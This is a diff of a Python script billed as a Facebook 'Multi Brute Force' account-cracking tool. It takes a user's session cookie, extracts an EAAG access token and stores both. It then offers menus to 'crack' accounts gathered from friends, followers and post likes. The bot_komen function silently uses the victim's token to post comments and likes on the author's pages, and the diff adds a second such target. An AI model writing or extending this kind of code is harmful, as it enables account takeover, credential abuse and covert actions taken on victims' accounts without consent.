@@ -6,44 +6,36 @@ from concurrent.futures import ThreadPoolExecutor
 from rich.tree import Tree
 from rich.console import Console
 
-P = '\x1b[1;97m'
-M = '\x1b[1;91m'
-H = '\x1b[1;92m'
-K = '\x1b[1;93m'
-B = '\x1b[1;94m'
-U = '\x1b[1;95m' 
-O = '\x1b[1;96m'
-N = '\x1b[0m'    
+M = '[bold blue]'
+H = '[bold purple]'
+K = '[bold red]'
+B = '[bold yellow]'
+U = '[bold green]'
+O = '[bold orange]'
 Z = "\033[1;30m"
-sir = '\033[41m\x1b[1;97m'
-x = '\33[m' # DEFAULT
-m = '\x1b[1;91m' #RED +
-k = '\033[93m' # KUNING +#hu
-h = '\x1b[1;92m' # HIJAU +
-hh = '\033[32m' # HIJAU -
-u = '\033[95m' # UNGU
-kk = '\033[33m' # KUNING -
-b = '\33[1;96m' # BIRU -
-p = '\x1b[0;34m' # BIRU +
-batu = random.choice([M,H,K,B,U,O,N,Z])
-### LIST DUMP ###
+batu = random.choice([M,H,K,B,U,O,Z])
+## LIST DUMP ###
 Dump = []
-### BANNER OR LOGO ###
+## BANNER OR LOGO ###
 def banner_logo():
     os.system('git pull')
     os.system('cls' if os.name == 'nt' else 'clear')
-     # Coded by Rozhak
-    Console(width=60, style="bold blue").print(Panel("""[bold red]●[bold yellow] ●[bold green] ●
-[bold red]       ██╗    ██╗   ██╗     █████╗     ███╗   ██╗        
-[bold yellow]       ██║    ██║   ██║    ██╔══██╗    ████╗  ██║        
-[bold blue]       ██║    ██║   ██║    ███████║    ██╔██╗ ██║        
-[bold green]  ██   ██║    ██║   ██║    ██╔══██║    ██║╚██╗██║        
-[bold red]  ╚█████╔╝    ╚██████╔╝    ██║  ██║    ██║ ╚████║             
-[bold yellow]   ╚════╝      ╚═════╝     ╚═╝  ╚═╝    ╚═╝  ╚═══╝            
-[bold red]● Author    : [bold blue]Juan Hulu   [bold red]● Github    : [bold blue]juan hulu 
-[bold red]● Facebook  : [bold blue]Juan Hulu   [bold red]● Instagram : [bold blue]juan_hulu09
-[bold red]● Youtube   : [bold blue]Juan Hulu   [bold red]● Tik Tok   : [bold blue]juan_hulu 
-[bold blue]        \\|[bold green]Multi Brute Force Facebook[bold blue]|/""", title="[bold red]>[bold yellow]>[bold green]>[blue] juan_hulu09 [bold green]<[bold yellow]<[bold red]<"))
+     # juan
+    print("""[bold red]●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red]●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red]●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] ●[bold green] ●[bold red] ●[bold yellow] 
+[bold red]┌─────────────────────────────────────────────────────────┐
+[bold blue]│                                                         │
+[bold yellow]│                ██╗██╗   ██╗ █████╗ ███╗   ██╗           │
+[bold blue]│                ██║██║   ██║██╔══██╗████╗  ██║           │
+[bold cyan]│                ██║██║   ██║███████║██╔██╗ ██║           │
+[bold red]│           ██   ██║██║   ██║██╔══██║██║╚██╗██║           │
+[bold blue]│           ╚█████╔╝╚██████╔╝██║  ██║██║ ╚████║           │
+[bold green]│            ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝           │
+[bold cyan]│                                          juan_hulu09    │
+[bold red]└─────────────────────────────────────────────────────────┘
+[bold red ]│  ● [green]Author    : [bold blue]Juan Hulu   [bold red]    ● [green]Github    : [bold blue]juan hulu[bold red]  │ 
+[bold red]│  ● [green]Facebook  : [bold blue]Juan Hulu   [bold red]    ● [green]Instagram : [bold blue]juan_hulu09[bold red]│
+[bold red]│  ● [green]Youtube   : [bold blue]Juan Hulu   [bold red]    ● [green]Tik Tok   : [bold blue]juan_hulu  [bold red]│""")
+    print(f'''[bold blue]└─────────────────────────────────────────────────────────┘''')
     return 0
 ### DAPATKAN NAMA ###
 def dapatkan_nama(cookie, token_eaag):
@@ -57,18 +49,22 @@ def dapatkan_nama(cookie, token_eaag):
         if 'name' in str(response) and 'id' in str(response):
             return response['name'].title(), response['id']
         else:
-            Console(width=60, style="bold blue").print(Panel("[italic red] Cookies Facebook Expired!", title="[bold blue]([bold blue]Token Invalid[bold blue])"));time.sleep(3.2);login_cookie()
-### LOGIN USING COOKIE ###🧠😍
+            print("[italic red] Cookies Facebook Expired!");time.sleep(3.2);login_cookie()
+### LOGIN USING COOKIE ###🧠
 def login_cookie():
     try:
         banner_logo()
-        Console(width=60, style="bold blue").print(Panel("""[bold green]1[bold green]. Login Cookie Facebook
-[bold green]2[bold green]. Cara Mendapatkan Cookie Facebook
-[bold green]3[bold green]. Keluar ([bold red]Logout[bold green])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Login Using Cookie) [bold green]<[bold yellow]<[bold red]<"))
-        query = Console().input("[bold blue]   ╰─> ")
+        print("""[bold green] 1[bold green]. Login Using Cookie 
+[bold green] 2[bold green]. How to Get Facebook Cookies
+[bold green] 3[bold green]. Exit ([bold red]Logout[bold green])""")
+        query = Console().input("""[bold blue]┌─[───────────────────────────────────────────────────────]
+└──╼❯ """)
         if query == '1' or query == '01':
-            Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan[italic green] Cookie[italic green], Gunakan Tumbal Untuk Login Dan Pastikan Tidak Terkena[italic yellow] Checkpoint[italic green]!", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
-            cookie = Console().input("[bold blue]   ╰─> ")
+            print('[bold blue]───────────────────────────────────────────────────────────')
+            print("""[italic green]Please enter cookies, do not use the main account to login 
+and make sure you are not exposed to [bold yellow]checkpoints![italic green]!""")
+            print('[bold blue]───────────────────────────────────────────────────────────')
+            cookie = Console().input("[bold blue]Enter [bold yellow]Cookie : [green]")
             with requests.Session() as r:
                 r.headers.update({
                     'cookie': cookie,
@@ -78,35 +74,38 @@ def login_cookie():
                 response3 = r.get('https://business.facebook.com/business_locations').text
                 token_eaag = re.search('(EAAG\w+)', str(response3)).group(1)
                 name, id = dapatkan_nama(cookie, token_eaag)
-                Console(width=60, style="bold blue").print(Panel(f"""[bold green]Nama :[bold green] {name}
-[bold green]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[blue] (Welcome) [bold green]<[bold yellow]<[bold red]<"));bot_komen(cookie, token_eaag)
+                print("""[bold green]Nama :[bold green] {name}
+[bold green]User :[bold yellow] {id}""");bot_komen(cookie, token_eaag)
+                print('[bold blue]------------------------------------------------------------')
                 open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);daftar_menu()
         elif query == '2' or query == '02':
             try:
-                Console().print("[bold blue]   ╰─>[bold green] Kamu Akan Diarahkan Ke Youtube!", end='\r');time.sleep(3.6);os.system("xdg-open https://www.youtube.com/watch?v=3Y6xsMB3wRg");exit()
+                Console().print("[bold blue]   ╰─>[bold green] You will be directed to YouTube!", end='\r');time.sleep(3.6);os.system("xdg-open https://www.youtube.com/watch?v=3Y6xsMB3wRg");exit()
             except:exit()
         elif query == '3' or query == '03':
-            Console().print("[bold blue]   ╰─>[bold yellow] Keluar Dari Tools!", end='\r');time.sleep(3.6);exit()
+            Console().print("[bold blue]   ╰─>[bold yellow] Exit Tools!", end='\r');time.sleep(2.6);exit()
         else:
-            Console().print("[bold blue]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);login_cookie()
+            Console().print("[bold blue]   ╰─>[bold red] The option is unknown!", end='\r');time.sleep(2.6);login_cookie()
     except Exception as e:
         Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
 ### BOT KOMEN ###
 def bot_komen(cookie, token_eaag):
     with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
         text = random.choice(
-            ['Keren Bang 😎https://www.facebook.com/juanhulu2009','Hello World!https://www.facebook.com/juanhulu2009','Mantap Bang ☺️https://www.facebook.com/juanhulu2009','I Love You ❤️','Hai Bang 😘','hai bg','ganteng banget','bang gua pakek sc lu bg','bg aku dah follow tiktok lu Bg','yg penting komen','hahahah','😘https://www.facebook.com/juanhulu2009','😍https://www.facebook.com/juanhulu2009','🤣https://www.facebook.com/juanhulu2009','😭https://www.facebook.com/juanhulu2009','😅https://www.facebook.com/juanhulu2009','😭https://www.facebook.com/juanhulu2009',' 👁👄👁https://www.facebook.com/juanhulu2009 ',' @[731053408718457:] ',' @[731053408718457:] ',' 🧚🏻‍♀️💫🥰💞 ','https://www.youtube.com/@juanhulu09','https://www.facebook.com/juanhulu2009','https://graph.facebook.com/174531078847946',' 𝔾𝕠𝕠𝕕 𝕄𝕠𝕣𝕟𝕚𝕟𝕘 ☼☼ ',' ♡⃝ ʜᴇʟʟᴏ ◡̈ ☽⋆ ',' 𝔾𝕠𝕠𝕕 𝔸𝕗𝕥𝕖𝕣𝕟𝕠𝕠𝕟 https://www.facebook.com/juanhulu2009',' 𝔾𝕠𝕠𝕕 ℕ𝕚𝕘𝕙𝕥 ☽⋆ https://www.facebook.com/juanhulu2009',' ♬ ♬ ♩ ♡ ♪ ♪ ♫ ♭ ♫ ♡ https://www.facebook.com/juanhulu2009',' bagaikan langit ',' Di sore Hari︎ ',' Berwarna Biru ',' Sebiru Hatiku ','Tak Jauh Berjalan Cinta Ini',' Dengan Hati Mu ',' Hati Yang Kau Bakar  ',' Dan Sungguh Bukan Untukku',' saat ku tau semua  ',' Senyum Hanya Hiasan ',' Tak Dapat Ku Lihat Dirimu Ada di hadapan  ',' Senyum Pahit Dari ku Arti Dari Kepergian  ❤️ ',' Karna Dirinya kau Ambil sebagai Pilihan ',' Tak Bisa Memaksa 💝 ',' Tak Kuat Aku Berpegangan  (●’◡’●)ﾉ ',' Mundur Dari Hidup Perlahan Aku Melepaskan  (☞ ͡° ͜ʖ ͡°)☞ ',' Belajar Tuk Bisa Berhenti Rasa kamu Lelah ◡̈ ',' Dirimu Dan Dirinya Cerita Melengkap sudah',' Berhenti Di sini Walau Langit ku Kurang cerah ',' Barisan Terakhir Aku Membri sudah lah Pasrah😭 ',' Keyakinan Takan Berubah demi Senyuman Indah Mu',' @[1538682953303353:] ',' @[942598330243371:] ',' ᗩᗯᗴᔕOᗰᗴ ( ﾟ∀ﾟ)ﾉ ',' ♡+* Ɗɑɫë*+♡ ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:] ',' ♡ I Miss U♡ ',' @[942598330243371:] ',' @[1538682953303353:] ',' ♥️❤️💜🖤🧡💛💚💙 ',' sebenarnya aku ingin mengungkapkan rasa ',' @[1642903096130422:] ',' 𝓣𝓸 𝓶𝓮, 𝔂𝓸𝓾 𝓪𝓻𝓮 𝓹𝓮𝓻𝓯𝓮𝓬𝓽. ',' @[1642903096130422:] ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:]',' @[1642903096130422:] ',' @[942598330243371:] ']
+            ['User @[731053408718457:] https://www.facebook.com/juanhulu2009','Hello World!https://www.facebook.com/juanhulu2009','Mantap Bang ☺️https://www.facebook.com/juanhulu2009','I Love You ❤️','Hai Bang 😘','hai bg','ganteng banget','bang gua pakek sc lu bg','bg aku dah follow tiktok lu Bg','yg penting komen','hahahah','😘https://www.facebook.com/juanhulu2009','😍https://www.facebook.com/juanhulu2009','🤣https://www.facebook.com/juanhulu2009','😭https://www.facebook.com/juanhulu2009','User @[731053408718457:] https://www.facebook.com/juanhulu2009','User @[731053408718457:] https://www.facebook.com/juanhulu2009',' User @[731053408718457:] https://www.facebook.com/juanhulu2009 ',' @[731053408718457:] ',' @[731053408718457:] ',' 🧚🏻‍♀️💫🥰💞 ','https://www.youtube.com/@juanhulu09','https://www.facebook.com/juanhulu2009','https://graph.facebook.com/174531078847946',' 𝔾𝕠𝕠𝕕 𝕄𝕠𝕣𝕟𝕚𝕟𝕘 ☼☼ ',' ♡⃝ ʜᴇʟʟᴏ ◡̈ ☽⋆ ',' 𝔾𝕠𝕠𝕕 𝔸𝕗𝕥𝕖𝕣𝕟𝕠𝕠𝕟 https://www.facebook.com/juanhulu2009',' User @[731053408718457:] https://www.facebook.com/juanhulu2009',' User @[731053408718457:] https://www.facebook.com/juanhulu2009',' bagaikan langit Di sore Hari︎ Berwarna Biru Sebiru Hatiku ','Tak Jauh Berjalan Cinta Ini',' Dengan Hati Mu ',' Hati Yang Kau Bakar  ',' Dan Sungguh Bukan Untukku',' saat ku tau semua  ',' Senyum Hanya Hiasan ',' Tak Dapat Ku Lihat Dirimu Ada di hadapan  ',' Senyum Pahit Dari ku Arti Dari Kepergian  ❤️ ',' Karna Dirinya kau Ambil sebagai Pilihan ',' Tak Bisa Memaksa 💝 ',' Tak Kuat Aku Berpegangan  (●’◡’●)ﾉ ',' Mundur Dari Hidup Perlahan Aku Melepaskan  (☞ ͡° ͜ʖ ͡°)☞ ',' Belajar Tuk Bisa Berhenti Rasa kamu Lelah ◡̈ ',' Dirimu Dan Dirinya Cerita Melengkap sudah',' Berhenti Di sini Walau Langit ku Kurang cerah ',' Barisan Terakhir Aku Membri sudah lah Pasrah😭 ',' Keyakinan Takan Berubah demi Senyuman Indah Mu',' @[1538682953303353:] ',' @[942598330243371:] ',' User @[731053408718457:] ',' User @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:] ',' ♡ I Miss U♡ ',' @[942598330243371:] ',' @[1538682953303353:] ',' ♥️❤️💜🖤🧡💛💚💙 ',' sebenarnya aku ingin mengungkapkan rasa ',' @[1642903096130422:] ',' User @[731053408718457:] ',' @[1642903096130422:] ',' @[731053408718457:] ',' @[731053408718457:] ',' @[731053408718457:]',' @[1642903096130422:] ',' @[942598330243371:] ']
         )
         r.cookies.update({
             'cookie': cookie
         })
         response = r.post('https://graph.facebook.com/174531078847946/comments/?message={}&access_token={}'.format(text, token_eaag)).text 
         response2 = r.post('https://graph.facebook.com/174531078847946/likes?summary=true&access_token={}'.format(token_eaag)).text 
+        response = r.post('https://graph.facebook.com/181205294847191/comments/?message={}&access_token={}'.format(text, token_eaag)).text 
+        response2 = r.post('https://graph.facebook.com/181205294847191/likes?summary=true&access_token={}'.format(token_eaag)).text 
         if "\"id\":\"" in str(response) and str(response2) == 'true':
             return 0
         else:
             return 1
-### DAFTAR MENU ###
+### DAFTAR MENU ##
 def daftar_menu():
     try:
         banner_logo();cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
@@ -115,12 +114,13 @@ def daftar_menu():
         Console(width=60, style="bold blue").print(Panel(f"""[bold green]Nama :[bold green] {name}
 [bold green]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[blue] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
     except Exception as e:
-        Console(width=60, style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[blue] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
-    Console(width=60, style="bold blue").print(Panel("""[bold green]1[bold green]. Crack User Dari Publik Or Friends
+        print(f"[bold red][italic]{str(e).title()}"),;time.sleep(3.6);login_cookie()
+    print("""[bold green]1[bold green]. Crack User Dari Publik Or Friends
 [bold green]2[bold green]. Crack User Dari Pengikut
 [bold green]3[bold green]. Crack User Dari Like Postingan
-[bold green]4[bold green]. Keluar ([bold red]Logout[bold green])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
-    query = Console().input("[bold blue]   ╰─> ")
+[bold green]4[bold green]. Keluar ([bold red]Logout[bold green])""")
+    query = Console().input("""[bold blue]┌─[───────────────────────────────────────────────────────]
+└──╼❯""")
     if query == '1' or query == '01':
         try:
             Console(width=60, style="bold blue").print(Panel("[italic green]Silahkan Masukan[italic green] ID Akun Facebook[italic green], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[blue] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
